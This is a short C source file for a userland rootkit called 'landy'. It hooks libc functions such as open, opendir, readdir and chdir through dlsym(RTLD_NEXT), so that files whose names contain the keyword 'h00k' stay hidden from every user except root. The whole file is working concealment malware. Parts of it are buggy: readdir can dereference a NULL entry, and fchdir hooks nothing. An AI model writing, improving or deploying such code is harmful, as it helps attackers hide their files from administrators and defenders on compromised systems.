#define _GNU_SOURCE
/*
*@@@ landy @@@
*Hooks system calls to hide files using a keyword
*
*/
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <stdarg.h>
#include <errno.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>

#define keyword "h00k"
#define permission "root"

//??
int (*old_open)(const char *pathname, int flags, mode_t mode);
int (*old_openat)(int dirfd, const char *pathname, int flags, mode_t mode);

//directory stuff
DIR *(*old_opendir)(const char *name);
DIR *(*old_opendir64)(const char *name);
struct dirent *(*old_readdir)(DIR *dirp);
int (*old_chdir)(const char *path);
int (*old_fchdir)(int fd);


int ismaster(){
    //TODO find a good way to verify that master is master
    //char *username;
    //username = malloc(256);
    //username = getlogin();

   //if(strcmp(username,permission) == 0){
     //  free(username);
//	return 0;
  //  }

    //free(username);
    if(getuid() == 0)
	return 0;
    
    return 1;

}

int open(const char *pathname, int flags, mode_t mode){
    
    if(!old_open){
	old_open = dlsym(RTLD_NEXT,"open");
    }

    if(strstr(pathname, keyword)){
	if(ismaster() != 0){
	    errno = EIO;
	    return -1;
	}
    }
    
    return old_open(pathname, flags, mode);

}

int openat(int dirfd, const char *pathname, int flags, mode_t mode){
    
    if(!old_openat){
	old_openat = dlsym(RTLD_NEXT,"openat");
    }

    if(strstr(pathname, keyword)){
	if(ismaster() != 0){
	    errno = EIO;
	    return -1;
	}
    }

    return old_openat(dirfd, pathname, flags, mode);
}

//hook the opendir function
DIR *opendir(const char *name){
    
    if(!old_opendir){
	old_opendir = dlsym(RTLD_NEXT,"opendir");
    }

    if(strstr(name, keyword)){
	if(ismaster() != 0){
	    errno = EIO;
	    return NULL;
	}
    }

    return old_opendir(name);
}

DIR *opendir64(const char *name){
    if(!old_opendir64){
	old_opendir64 = dlsym(RTLD_NEXT,"opendir64");
    }
   
    if(strstr(name, keyword)){
	if(ismaster() != 0){
	    errno = EIO;
	    return NULL;
	}
    }

    return old_opendir64(name);

}

struct dirent *readdir(DIR *dirp){
  
    struct dirent *dir;

    if(!old_readdir){
	old_readdir = dlsym(RTLD_NEXT,"readdir");
    }
    
    dir = old_readdir(dirp);

    //hides via keyword. Needs more testing
    if(strstr(dir->d_name, keyword)){
	if(ismaster() != 0){
	    errno = EIO;
	    return 0;
	}
    }

    //printf("hit\n");
    return dir;

}

int chdir(const char *path){
    
    //TODO vim is breaking here and in fchdir, we need to fix that :(

    if(!old_chdir){
	old_chdir = dlsym(RTLD_NEXT,"chdir");
    }

    if(strstr(path, keyword)){
	if(ismaster() != 0){
	    errno = EIO;
	    return -1;
	}
    }
    return old_chdir(path);

}

int fchdir(int fd){
    
    if(!old_fchdir){
	old_fchdir = dlsym(RTLD_NEXT,"fchdir");
    }
    
    return old_fchdir(fd);
}



